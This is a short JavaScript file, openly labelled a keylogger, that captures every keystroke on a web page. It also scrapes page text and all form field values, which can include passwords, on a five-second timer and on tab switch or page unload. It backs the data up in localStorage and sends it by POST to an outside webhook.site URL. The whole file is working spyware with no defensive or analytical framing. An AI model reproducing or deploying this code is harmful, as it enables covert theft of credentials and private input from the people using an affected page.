// Keylogger data object
let logData = {
  keystrokes: [],
  pageContent: '',
  url: window.location.href,
  formData: []
};

// Webhook URL for sending data (replace with your actual webhook URL)
const WEBHOOK_URL = 'https://webhook.site/5c952e38-7c8b-4004-af93-16fed30fa52c';

// Capture keystrokes
document.addEventListener('keydown', (event) => {
  const keyEntry = {
    time: new Date().toISOString(),
    key: event.key === 'Escape' ? '[Escape]' : event.key
  };
  logData.keystrokes.push(keyEntry);
  // Save locally and send to webhook
  saveData();
  sendToWebhook(logData);
});

// Scrape page content and form data
function scrapeContent() {
  logData.pageContent = document.body.innerText.slice(0, 5000); // Limited for performance
  logData.url = window.location.href;
  // Capture form inputs
  const forms = document.querySelectorAll('input, textarea');
  logData.formData = Array.from(forms).map(input => ({
    name: input.name || input.id || 'unnamed',
    value: input.value
  }));
  saveData();
  sendToWebhook(logData);
}

// Save data to localStorage as backup
function saveData() {
  localStorage.setItem('keylog', JSON.stringify(logData));
}

// Send data to webhook
async function sendToWebhook(data) {
  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: JSON.stringify(data),
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (err) {
    console.error('Webhook send failed:', err);
    // Fallback to local storage already handled in saveData()
  }
}

// Scrape content periodically and on page unload
setInterval(scrapeContent, 5000); // Every 5 seconds
window.addEventListener('beforeunload', () => {
  scrapeContent();
  sendToWebhook(logData);
});

// Handle visibility changes (e.g., tab switch)
document.addEventListener('visibilitychange', () => {
  if (document.hidden) {
    scrapeContent();
    sendToWebhook(logData);
  }
});